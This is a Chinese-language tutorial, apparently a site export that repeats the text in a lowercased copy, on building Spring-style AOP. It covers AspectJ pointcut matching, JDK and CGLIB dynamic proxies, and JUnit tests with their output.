AOP 中，可以通过 Pointcut 来定义一个切点，然后使用 MethodMatcher 进行方法匹配。\n    \n    * 在匹配过程中，Spring 将会遍历所有的方法，将每个方法传递给 MethodMatcher 的 matches 方法进行匹配。\n    * 如果这个方法符合条件，则将其加入到代理列表中，否则跳过不处理。\n\npublic interface MethodMatcher {\n\n    /**\n     * 用于在代理对象上进行目标方法匹配，判断是否符合条件\n     *\n     * @param method      方法\n     * @param targetClass 目标类\n     * @return boolean\n     */\n    boolean matches(Method method, Class<?> targetClass);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 具体的实现\n\n 1. AspectJExpressionPointcut\n    \n    AspectJExpressionPointcut 是 Spring 框架中实现 Pointcut 接口的一个具体实现类，用于定义一个基于 AspectJ 表达式的静态切点。\n    \n    AspectJ 是一种基于注解的 AOP 框架，它提供了一组强大的注解和表达式来进行方法拦截和增强。\n\npublic class AspectJExpressionPointcut implements Pointcut, ClassFilter, MethodMatcher {\n\n    private static final Set<PointcutPrimitive> SUPPORTED_PRIMITIVES = new HashSet<>();\n\n    static {\n        SUPPORTED_PRIMITIVES.add(PointcutPrimitive.EXECUTION);\n    }\n\n    private final PointcutExpression pointcutExpression;\n\n    public AspectJExpressionPointcut(String expression) {\n        PointcutParser pointcutParser =\n                PointcutParser.getPointcutParserSupportingSpecifiedPrimitivesAndUsingSpecifiedClassLoaderForResolution(\n                        SUPPORTED_PRIMITIVES, this.getClass().getClassLoader());\n        pointcutExpression = pointcutParser.parsePointcutExpression(expression);\n    }\n\n    @Override\n    public boolean matches(Class<?> clazz) {\n        return pointcutExpression.couldMatchJoinPointsInType(clazz);\n    }\n\n    @Override\n    public boolean matches(Method method, Class<?> targetClass) {\n        return pointcutExpression.matchesMethodExecution(method).alwaysMatches();\n    }\n\n    @Override\n    public ClassFilter getClassFilter() {\n        return this;\n    }\n\n    @Override\n    public MethodMatcher getMethodMatcher() {\n        return this;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# 将实现加入原有的逻辑中\n\n * 无\n\n\n# 测试\n\n * 测试类\n\n    @Test\n    public void aspectJExpressionPointcutTest() throws NoSuchMethodException {\n        AspectJExpressionPointcut pointcut =\n                new AspectJExpressionPointcut("execution(* com.snail.springframework.beans.factory.bean.Cat.*(..))");\n        Class<Cat> clazz = Cat.class;\n        Method method = clazz.getDeclaredMethod("toString");\n\n        System.out.println(pointcut.matches(clazz));\n        System.out.println(pointcut.matches(method, clazz));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * 测试结果\n\ntrue\ntrue\n\nProcess finished with exit code 0\n\n\n1\n2\n3\n4\n\n\n\n# 封装动态代理\n\n动态代理的实现肯定是代理切面表达式匹配到的方法，所以我们实现一个动态代理需要的核心三元素就是：\n\n 1. MethodMatcher 方法匹配器\n 2. TargetSource 被代理对象\n 3. MethodInterceptor 方法拦截器，拦截方法实现类，由用户自己实现\n\n我们要做的就是把这些封装简化，对用户而言只需要一个 AopProxy#getProxy 获取代理对象。\n\n\n# 定义一些职责和能力\n\n 1. AopProxy\n    \n    AopProxy 接口是实现 AOP 的关键，它用于创建一个代理对象来拦截目标对象的方法调用，并将增强逻辑嵌入到方法调用过程中。通过 AopProxy，可以将任何普通的 Java 对象转换成带有切面的代理对象，从而实现 AOP 功能。\n    \n    Spring 提供了多种类型的 AopProxy 实现，包括 JDK 动态代理和 CGLIB 代理。在使用 Spring 进行 AOP 编程时，可以根据需要选择不同的代理实现来生成代理对象。\n\npublic interface AopProxy {\n\n    /**\n     * 获得代理\n     *\n     * @return {@link Object}\n     */\n    Object getProxy();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 具体的实现\n\n 1. TargetSource：被代理的对象信息\n\npublic class TargetSource {\n\n    private final Object target;\n\n    public TargetSource(Object target) {\n        this.target = target;\n    }\n\n    public Class<?>[] getTargetClass() {\n        return this.target.getClass().getInterfaces();\n    }\n\n    public Object getTarget() {\n        return target;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n 2. AdvisedSupport\n    \n    主要是用于把代理、拦截、匹配的各项属性包装到一个类中，方便在 AopProxy 实现类进行使用。\n\npublic class AdvisedSupport {\n\n    /**\n     * 被代理对象\n     */\n    private TargetSource targetSource;\n\n    /**\n     * 方法拦截器，拦截方法实现类，由用户自己实现\n     */\n    private MethodInterceptor methodInterceptor;\n\n    /**\n     * 方法匹配器（切面表达式）\n     */\n    private MethodMatcher methodMatcher;\n\n    public TargetSource getTargetSource() {\n        return targetSource;\n    }\n\n    public void setTargetSource(TargetSource targetSource) {\n        this.targetSource = targetSource;\n    }\n\n    public MethodInterceptor getMethodInterceptor() {\n        return methodInterceptor;\n    }\n\n    public void setMethodInterceptor(MethodInterceptor methodInterceptor) {\n        this.methodInterceptor = methodInterceptor;\n    }\n\n    public MethodMatcher getMethodMatcher() {\n        return methodMatcher;\n    }\n\n    public void setMethodMatcher(MethodMatcher methodMatcher) {\n        this.methodMatcher = methodMatcher;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n 3. ReflectiveMethodInvocation\n    \n    ReflectiveMethodInvocation 是 Spring AOP 中实现 MethodInvocation 接口的一个具体类，用于封装方法调用信息并提供一些便捷的操作方法。在 AOP 操作中，ReflectiveMethodInvocation 负责将目标对象的方法调用转发到代理对象，并提供了运行时切面通知所需的 Method 对象、参数，以及目标对象等信息。\n\npublic class ReflectiveMethodInvocation implements MethodInvocation {\n\n    /**\n     * 目标\n     */\n    protected final Object target;\n    /**\n     * 方法\n     */\n    protected final Method method;\n    /**\n     * 参数\n     */\n    protected final Object[] arguments;\n\n    public ReflectiveMethodInvocation(Object target, Method method, Object[] arguments) {\n        this.target = target;\n        this.method = method;\n        this.arguments = arguments;\n    }\n\n    @Override\n    public Method getMethod() {\n        return method;\n    }\n\n    @Override\n    public Object[] getArguments() {\n        return arguments;\n    }\n\n    @Override\n    public Object proceed() throws Throwable {\n        return method.invoke(target, arguments);\n    }\n\n    @Override\n    public Object getThis() {\n        return target;\n    }\n\n    @Override\n    public AccessibleObject getStaticPart() {\n        return method;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# 将实现加入原有的逻辑中\n\n这里没有原先的逻辑，只是将上述的实现整合加入不同的动态代理实现类中。\n\n 1. JdkDynamicAopProxy\n    \n    JdkDynamicAopProxy 是 Spring AOP 中的一个核心类，实现了 AopProxy 接口和 jdk 代理的 InvocationHandler 接口，用于创建使用 JDK 动态代理技术实现的 AOP 代理对象。JDK 动态代理只能代理接口，因此 JdkDynamicAopProxy 只能为实现了接口的目标对象创建代理。\n\npublic class JdkDynamicAopProxy implements AopProxy, InvocationHandler {\n\n    private final AdvisedSupport advised;\n\n    public JdkDynamicAopProxy(AdvisedSupport advised) {\n        this.advised = advised;\n    }\n\n    @Override\n    public Object getProxy() {\n        return Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),\n                advised.getTargetSource().getTargetClass(), this);\n    }\n\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        // 1. 获取被代理的类\n        Object targetObject = advised.getTargetSource().getTarget();\n        // 2. 获取表达式匹配器\n        MethodMatcher methodMatcher = advised.getMethodMatcher();\n        // 3. 获取用户自己实现的方法拦截器\n        MethodInterceptor methodInterceptor = advised.getMethodInterceptor();\n        // 4. 符合指定的切面规则的话，invoke 3.用户自己实现的方法拦截器\n        if (methodMatcher.matches(method, targetObject.getClass())) {\n            return methodInterceptor.invoke(new ReflectiveMethodInvocation(targetObject, method, args));\n        }\n        return method.invoke(targetObject, args);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n 2. Cglib2AopProxy\n    \n    Cglib2AopProxy 是 Spring AOP 中基于 CGLIB 技术实现的代理对象创建类，实现了 AopProxy 接口。与 JDK 动态代理不同，CGLIB 可以为没有实现接口的类生成代理，因此 Cglib2AopProxy 可以为任何类创建代理。\n\npublic class Cglib2AopProxy implements AopProxy {\n\n    private final AdvisedSupport advised;\n\n    public Cglib2AopProxy(AdvisedSupport advised) {\n        this.advised = advised;\n    }\n\n    @Override\n    public Object getProxy() {\n        Enhancer enhancer = new Enhancer();\n        enhancer.setSuperclass(advised.getTargetSource().getTarget().getClass());\n        enhancer.setInterfaces(advised.getTargetSource().getTargetClass());\n        enhancer.setCallback(new DynamicAdvisedInterceptor(advised));\n        return enhancer.create();\n    }\n\n    private static class DynamicAdvisedInterceptor implements MethodInterceptor {\n        private final AdvisedSupport advised;\n\n        private DynamicAdvisedInterceptor(AdvisedSupport advised) {\n            this.advised = advised;\n        }\n\n        @Override\n        public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable {\n            Object targetObject = advised.getTargetSource().getTarget();\n            MethodMatcher methodMatcher = advised.getMethodMatcher();\n            org.aopalliance.intercept.MethodInterceptor methodInterceptor = advised.getMethodInterceptor();\n            CglibMethodInvocation methodInvocation = new CglibMethodInvocation(targetObject, method, args, proxy);\n            if (methodMatcher.matches(method, targetObject.getClass())) {\n                return methodInterceptor.invoke(methodInvocation);\n            }\n            return methodInvocation.proceed();\n        }\n    }\n\n    private static class CglibMethodInvocation extends ReflectiveMethodInvocation {\n\n        private final MethodProxy methodProxy;\n\n        public CglibMethodInvocation(Object target, Method method, Object[] arguments, MethodProxy methodProxy) {\n            super(target, method, arguments);\n            this.methodProxy = methodProxy;\n        }\n\n        @Override\n        public Object proceed() throws Throwable {\n            return methodProxy.invoke(getThis(), getArguments());\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n# 测试\n\n * xml 准备，无。\n\n * 提前准备\n   \n   自定义 aop 拦截后的处理类：TigerInterceptor\n\npublic class TigerInterceptor implements MethodInterceptor {\n\n    @Override\n    public Object invoke(MethodInvocation invocation) throws Throwable {\n        System.out.println("~方法执行前~");\n        Object result = invocation.proceed();\n        ThreadUtil.sleep(100);\n        System.out.println("~方法执行后~ 返回结果：" + result);\n        return result;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n * 测试类\n\n    @Test\n    public void aopTest() throws NoSuchMethodException {\n        AspectJExpressionPointcut pointcut =\n                new AspectJExpressionPointcut("execution(* com.snail.springframework.beans.factory.bean.Animal.*(..))");\n        Tiger tiger = new Tiger();\n        tiger.setName("[11 hu~]");\n        System.out.println("tiger：" + tiger.getAnimalName());\n        System.out.println("------------------");\n\n        AdvisedSupport advised = new AdvisedSupport();\n        advised.setMethodMatcher(pointcut);\n        advised.setTargetSource(new TargetSource(tiger));\n        advised.setMethodInterceptor(new TigerInterceptor());\n\n        Animal jdkProxy = (Animal) new JdkDynamicAopProxy(advised).getProxy();\n        tiger.setName("[12 hu~ jdkProxy]");\n        System.out.println("jdk aop：" + jdkProxy.getAnimalName());\n        System.out.println("------------------");\n        Animal cglibProxy = (Animal) new Cglib2AopProxy(advised).getProxy();\n        tiger.setName("[13 hu~ cglibProxy]");\n        System.out.println("cglib aop：" + cglibProxy.getAnimalName());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n * 测试结果\n\ntiger：[11 hu~]\n------------------\n~方法执行前~\n~方法执行后~ 返回结果：[12 hu~ jdkProxy]\njdk aop：[12 hu~ jdkProxy]\n------------------\n~方法执行前~\n~方法执行后~ 返回结果：[13 hu~ cglibProxy]\ncglib aop：[13 hu~ cglibProxy]\n\nProcess finished with exit code 0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 总结\n\nAOP（面向切面编程）代理的实现可以分为两类：基于 JDK 动态代理和基于 CGLIB 技术。\n\n基于 JDK 动态代理的实现是通过实现 InvocationHandler 接口以及调用 Proxy.newProxyInstance 方法来创建代理对象。JDK 动态代理只能代理接口，因此需要为目标对象接口定义一个代理对象，并实现 InvocationHandler 的 invoke 方法来实现增强逻辑。JDK 动态代理的优点是速度相对较快，缺点则是只能代理接口，无法代理类。\n\n基于 CGLIB 技术的实现是通过继承 Enhancer 类并重写 CallbackFilter 和 intercept 方法来创建代理对象。CGLIB 可以为没有实现接口的类生成代理，因此可以为任何类创建代理。在 CGLIB 实现中，可以使用 MethodInterceptor 将代理对象、目标对象和方法参数打包成 MethodInvocation 对象，并通过该对象调用目标方法并应用切面增强逻辑。CGLIB 的优点是可以代理任意类，缺点则是相对 JDK 动态代理速度稍慢。\n\n在 Spring AOP 中，还有一些其它的类和接口，比如 ReflectiveMethodInvocation、AopProxy、AdvisedSupport 等，它们与代理对象创建密切相关。ReflectiveMethodInvocation 类用于封装方法调用信息并提供一些便捷的操作方法，AopProxy 接口用于定义获取代理对象的方法，AdvisedSupport 类用于保存 AOP 配置信息。这些类和接口配合使用，可以方便地创建代理对象，并将切面逻辑应用到目标对象的方法调用中。\n\n总之，AOP 代理是 Spring AOP 的核心功能之一，它可以帮助程序员将切面逻辑与目标对象的业务逻辑分离，从而实现更加灵活、高效的应用开发。无论是基于 JDK 动态代理还是基于 CGLIB 技术实现，都能够通过 Spring 框架提供的类和接口来快速创建代理对象，并将切面逻辑应用到目标对象的方法调用中。',normalizedContent:'这个文档讨论了如何使用 spring aop 实现动态代理。它包括了 aspectjexpressionpointcut、targetsource、advisedsupport、reflectivemethodinvocation、aopproxy、jdkdynamicaopproxy 和 cglib2aopproxy 等类的实现。\n\n此外，文档还提供了一个 tigerinterceptor 类，该类演示了如何在代理对象上拦截方法调用并执行增强逻辑。最后，文档提供了一个测试类，该类演示了如何使用 spring aop 创建动态代理对象。\n\n\n\n * 解析\n * 实现切面表达式\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 封装动态代理\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\naop 的实现，最主要的核心就是切面表达式和动态代理。切面表达式匹配到指定的切面，再交由不用的代理（jdk 或 cglib）来实现。而他们的实现已经由 aspectj 、jdk 、 cglib 实现了，我们所作的就是封装他们的复杂性，将一个简单的类或功能暴露出来。\n\n切面表达式：使用 aspectj 的 org.aspectj.weaver.tools.pointcutexpression\n\n动态代理：将 jdk 和 cglib 的代理统一由 aopalliance 的 org.aopalliance.intercept.methodinterceptor 和 org.aopalliance.intercept.methodinvocation 实现（换句话说，aopalliance 将方法的调用转发到不同的代理实现中）。\n\n这样对用户来说，只需 ① 自己定义一个切面表达式和 ② 自己实现 methodinvocation 来实现切面，简单了用户操作，屏蔽了底层实现。\n\n\n# 实现切面表达式\n\n切面表达式就一个作用：过滤出指定的类和方法。\n\n\n# 定义一些职责和能力\n\n 1. pointcut\n    \n    pointcut 接口是 spring 框架 aop（面向切面编程）的一个核心接口，它用于描述一组需要被拦截的方法或类。\n    \n    在 spring 中，pointcut 可以被看作是一个逻辑切面，它包含了需要被增强的方法和类的信息，并可以根据这些信息来决定哪些方法需要被拦截和增强。\n\npublic interface pointcut {\n\n    /**\n     * 获取类过滤器\n     * 类过滤器用于对目标类进行筛选和匹配，以便确定哪些类需要被代理和增强；\n     *\n     * @return {@link classfilter}\n     */\n    classfilter getclassfilter();\n\n    /**\n     * 获取方法匹配器\n     * 方法匹配器用于对目标类的方法进行筛选和匹配，以便确定哪些方法需要被拦截和增强；\n     *\n     * @return {@link methodmatcher}\n     */\n    methodmatcher getmethodmatcher();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n 2. classfilter\n    \n    在 aop 中，classfilter 用于在 beanfactory 和 applicationcontext 中过滤出需要被代理的类，主要作用是对目标类进行筛选和匹配，以便确定哪些类需要被代理和增强。\n    \n    例如，在 spring aop 中，可以使用切点（pointcut）来定义一个需要拦截的切点，然后使用 classfilter 对目标类进行筛选和匹配。\n    \n    * 在匹配过程中，spring 将会遍历所有的类，将每个类传递给 classfilter 的 matches 方法进行匹配。\n    \n    * 如果这个类符合条件，则将其加入到代理列表中，否则跳过不处理。\n\npublic interface classfilter {\n\n    /**\n     * 用于判断指定的 class 对象是否符合条件\n     *\n     * @param clazz clazz\n     * @return boolean\n     */\n    boolean matches(class<?> clazz);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n 3. methodmatcher\n    \n    在 aop 中，methodmatcher 主要作用是对目标类的方法进行筛选和匹配，以便确定哪些方法需要被拦截和增强。通常情况下，methodmatcher 总是和 classfilter 一起使用，以实现更加细粒度的 aop 控制。\n    \n    例如，在 spring aop 中，可以通过 pointcut 来定义一个切点，然后使用 methodmatcher 进行方法匹配。\n    \n    * 在匹配过程中，spring 将会遍历所有的方法，将每个方法传递给 methodmatcher 的 matches 方法进行匹配。\n    * 如果这个方法符合条件，则将其加入到代理列表中，否则跳过不处理。\n\npublic interface methodmatcher {\n\n    /**\n     * 用于在代理对象上进行目标方法匹配，判断是否符合条件\n     *\n     * @param method      方法\n     * @param targetclass 目标类\n     * @return boolean\n     */\n    boolean matches(method method, class<?> targetclass);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 具体的实现\n\n 1. aspectjexpressionpointcut\n    \n    aspectjexpressionpointcut 是 spring 框架中实现 pointcut 接口的一个具体实现类，用于定义一个基于 aspectj 表达式的静态切点。\n    \n    aspectj 是一种基于注解的 aop 框架，它提供了一组强大的注解和表达式来进行方法拦截和增强。\n\npublic class aspectjexpressionpointcut implements pointcut, classfilter, methodmatcher {\n\n    private static final set<pointcutprimitive> supported_primitives = new hashset<>();\n\n    static {\n        supported_primitives.add(pointcutprimitive.execution);\n    }\n\n    private final pointcutexpression pointcutexpression;\n\n    public aspectjexpressionpointcut(string expression) {\n        pointcutparser pointcutparser =\n                pointcutparser.getpointcutparsersupportingspecifiedprimitivesandusingspecifiedclassloaderforresolution(\n                        supported_primitives, this.getclass().getclassloader());\n        pointcutexpression = pointcutparser.parsepointcutexpression(expression);\n    }\n\n    @override\n    public boolean matches(class<?> clazz) {\n        return pointcutexpression.couldmatchjoinpointsintype(clazz);\n    }\n\n    @override\n    public boolean matches(method method, class<?> targetclass) {\n        return pointcutexpression.matchesmethodexecution(method).alwaysmatches();\n    }\n\n    @override\n    public classfilter getclassfilter() {\n        return this;\n    }\n\n    @override\n    public methodmatcher getmethodmatcher() {\n        return this;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# 将实现加入原有的逻辑中\n\n * 无\n\n\n# 测试\n\n * 测试类\n\n    @test\n    public void aspectjexpressionpointcuttest() throws nosuchmethodexception {\n        aspectjexpressionpointcut pointcut =\n                new aspectjexpressionpointcut("execution(* com.snail.springframework.beans.factory.bean.cat.*(..))");\n        class<cat> clazz = cat.class;\n        method method = clazz.getdeclaredmethod("tostring");\n\n        system.out.println(pointcut.matches(clazz));\n        system.out.println(pointcut.matches(method, clazz));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * 测试结果\n\ntrue\ntrue\n\nprocess finished with exit code 0\n\n\n1\n2\n3\n4\n\n\n\n# 封装动态代理\n\n动态代理的实现肯定是代理切面表达式匹配到的方法，所以我们实现一个动态代理需要的核心三元素就是：\n\n 1. methodmatcher 方法匹配器\n 2. targetsource 被代理对象\n 3. methodinterceptor 方法拦截器，拦截方法实现类，由用户自己实现\n\n我们要做的就是把这些封装简化，对用户而言只需要一个 aopproxy#getproxy 获取代理对象。\n\n\n# 定义一些职责和能力\n\n 1. aopproxy\n    \n    aopproxy 接口是实现 aop 的关键，它用于创建一个代理对象来拦截目标对象的方法调用，并将增强逻辑嵌入到方法调用过程中。通过 aopproxy，可以将任何普通的 java 对象转换成带有切面的代理对象，从而实现 aop 功能。\n    \n    spring 提供了多种类型的 aopproxy 实现，包括 jdk 动态代理和 cglib 代理。在使用 spring 进行 aop 编程时，可以根据需要选择不同的代理实现来生成代理对象。\n\npublic interface aopproxy {\n\n    /**\n     * 获得代理\n     *\n     * @return {@link object}\n     */\n    object getproxy();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 具体的实现\n\n 1. targetsource：被代理的对象信息\n\npublic class targetsource {\n\n    private final object target;\n\n    public targetsource(object target) {\n        this.target = target;\n    }\n\n    public class<?>[] gettargetclass() {\n        return this.target.getclass().getinterfaces();\n    }\n\n    public object gettarget() {\n        return target;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n 2. advisedsupport\n    \n    主要是用于把代理、拦截、匹配的各项属性包装到一个类中，方便在 aopproxy 实现类进行使用。\n\npublic class advisedsupport {\n\n    /**\n     * 被代理对象\n     */\n    private targetsource targetsource;\n\n    /**\n     * 方法拦截器，拦截方法实现类，由用户自己实现\n     */\n    private methodinterceptor methodinterceptor;\n\n    /**\n     * 方法匹配器（切面表达式）\n     */\n    private methodmatcher methodmatcher;\n\n    public targetsource gettargetsource() {\n        return targetsource;\n    }\n\n    public void settargetsource(targetsource targetsource) {\n        this.targetsource = targetsource;\n    }\n\n    public methodinterceptor getmethodinterceptor() {\n        return methodinterceptor;\n    }\n\n    public void setmethodinterceptor(methodinterceptor methodinterceptor) {\n        this.methodinterceptor = methodinterceptor;\n    }\n\n    public methodmatcher getmethodmatcher() {\n        return methodmatcher;\n    }\n\n    public void setmethodmatcher(methodmatcher methodmatcher) {\n        this.methodmatcher = methodmatcher;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n 3. reflectivemethodinvocation\n    \n    reflectivemethodinvocation 是 spring aop 中实现 methodinvocation 接口的一个具体类，用于封装方法调用信息并提供一些便捷的操作方法。在 aop 操作中，reflectivemethodinvocation 负责将目标对象的方法调用转发到代理对象，并提供了运行时切面通知所需的 method 对象、参数，以及目标对象等信息。\n\npublic class reflectivemethodinvocation implements methodinvocation {\n\n    /**\n     * 目标\n     */\n    protected final object target;\n    /**\n     * 方法\n     */\n    protected final method method;\n    /**\n     * 参数\n     */\n    protected final object[] arguments;\n\n    public reflectivemethodinvocation(object target, method method, object[] arguments) {\n        this.target = target;\n        this.method = method;\n        this.arguments = arguments;\n    }\n\n    @override\n    public method getmethod() {\n        return method;\n    }\n\n    @override\n    public object[] getarguments() {\n        return arguments;\n    }\n\n    @override\n    public object proceed() throws throwable {\n        return method.invoke(target, arguments);\n    }\n\n    @override\n    public object getthis() {\n        return target;\n    }\n\n    @override\n    public accessibleobject getstaticpart() {\n        return method;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# 将实现加入原有的逻辑中\n\n这里没有原先的逻辑，只是将上述的实现整合加入不同的动态代理实现类中。\n\n 1. jdkdynamicaopproxy\n    \n    jdkdynamicaopproxy 是 spring aop 中的一个核心类，实现了 aopproxy 接口和 jdk 代理的 invocationhandler 接口，用于创建使用 jdk 动态代理技术实现的 aop 代理对象。jdk 动态代理只能代理接口，因此 jdkdynamicaopproxy 只能为实现了接口的目标对象创建代理。\n\npublic class jdkdynamicaopproxy implements aopproxy, invocationhandler {\n\n    private final advisedsupport advised;\n\n    public jdkdynamicaopproxy(advisedsupport advised) {\n        this.advised = advised;\n    }\n\n    @override\n    public object getproxy() {\n        return proxy.newproxyinstance(thread.currentthread().getcontextclassloader(),\n                advised.gettargetsource().gettargetclass(), this);\n    }\n\n    @override\n    public object invoke(object proxy, method method, object[] args) throws throwable {\n        // 1. 获取被代理的类\n        object targetobject = advised.gettargetsource().gettarget();\n        // 2. 获取表达式匹配器\n        methodmatcher methodmatcher = advised.getmethodmatcher();\n        // 3. 获取用户自己实现的方法拦截器\n        methodinterceptor methodinterceptor = advised.getmethodinterceptor();\n        // 4. 符合指定的切面规则的话，invoke 3.用户自己实现的方法拦截器\n        if (methodmatcher.matches(method, targetobject.getclass())) {\n            return methodinterceptor.invoke(new reflectivemethodinvocation(targetobject, method, args));\n        }\n        return method.invoke(targetobject, args);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n 2. cglib2aopproxy\n    \n    cglib2aopproxy 是 spring aop 中基于 cglib 技术实现的代理对象创建类，实现了 aopproxy 接口。与 jdk 动态代理不同，cglib 可以为没有实现接口的类生成代理，因此 cglib2aopproxy 可以为任何类创建代理。\n\npublic class cglib2aopproxy implements aopproxy {\n\n    private final advisedsupport advised;\n\n    public cglib2aopproxy(advisedsupport advised) {\n        this.advised = advised;\n    }\n\n    @override\n    public object getproxy() {\n        enhancer enhancer = new enhancer();\n        enhancer.setsuperclass(advised.gettargetsource().gettarget().getclass());\n        enhancer.setinterfaces(advised.gettargetsource().gettargetclass());\n        enhancer.setcallback(new dynamicadvisedinterceptor(advised));\n        return enhancer.create();\n    }\n\n    private static class dynamicadvisedinterceptor implements methodinterceptor {\n        private final advisedsupport advised;\n\n        private dynamicadvisedinterceptor(advisedsupport advised) {\n            this.advised = advised;\n        }\n\n        @override\n        public object intercept(object obj, method method, object[] args, methodproxy proxy) throws throwable {\n            object targetobject = advised.gettargetsource().gettarget();\n            methodmatcher methodmatcher = advised.getmethodmatcher();\n            org.aopalliance.intercept.methodinterceptor methodinterceptor = advised.getmethodinterceptor();\n            cglibmethodinvocation methodinvocation = new cglibmethodinvocation(targetobject, method, args, proxy);\n            if (methodmatcher.matches(method, targetobject.getclass())) {\n                return methodinterceptor.invoke(methodinvocation);\n            }\n            return methodinvocation.proceed();\n        }\n    }\n\n    private static class cglibmethodinvocation extends reflectivemethodinvocation {\n\n        private final methodproxy methodproxy;\n\n        public cglibmethodinvocation(object target, method method, object[] arguments, methodproxy methodproxy) {\n            super(target, method, arguments);\n            this.methodproxy = methodproxy;\n        }\n\n        @override\n        public object proceed() throws throwable {\n            return methodproxy.invoke(getthis(), getarguments());\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n# 测试\n\n * xml 准备，无。\n\n * 提前准备\n   \n   自定义 aop 拦截后的处理类：tigerinterceptor\n\npublic class tigerinterceptor implements methodinterceptor {\n\n    @override\n    public object invoke(methodinvocation invocation) throws throwable {\n        system.out.println("~方法执行前~");\n        object result = invocation.proceed();\n        threadutil.sleep(100);\n        system.out.println("~方法执行后~ 返回结果：" + result);\n        return result;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n * 测试类\n\n    @test\n    public void aoptest() throws nosuchmethodexception {\n        aspectjexpressionpointcut pointcut =\n                new aspectjexpressionpointcut("execution(* com.snail.springframework.beans.factory.bean.animal.*(..))");\n        tiger tiger = new tiger();\n        tiger.setname("[11 hu~]");\n        system.out.println("tiger：" + tiger.getanimalname());\n        system.out.println("------------------");\n\n        advisedsupport advised = new advisedsupport();\n        advised.setmethodmatcher(pointcut);\n        advised.settargetsource(new targetsource(tiger));\n        advised.setmethodinterceptor(new tigerinterceptor());\n\n        animal jdkproxy = (animal) new jdkdynamicaopproxy(advised).getproxy();\n        tiger.setname("[12 hu~ jdkproxy]");\n        system.out.println("jdk aop：" + jdkproxy.getanimalname());\n        system.out.println("------------------");\n        animal cglibproxy = (animal) new cglib2aopproxy(advised).getproxy();\n        tiger.setname("[13 hu~ cglibproxy]");\n        system.out.println("cglib aop：" + cglibproxy.getanimalname());\n    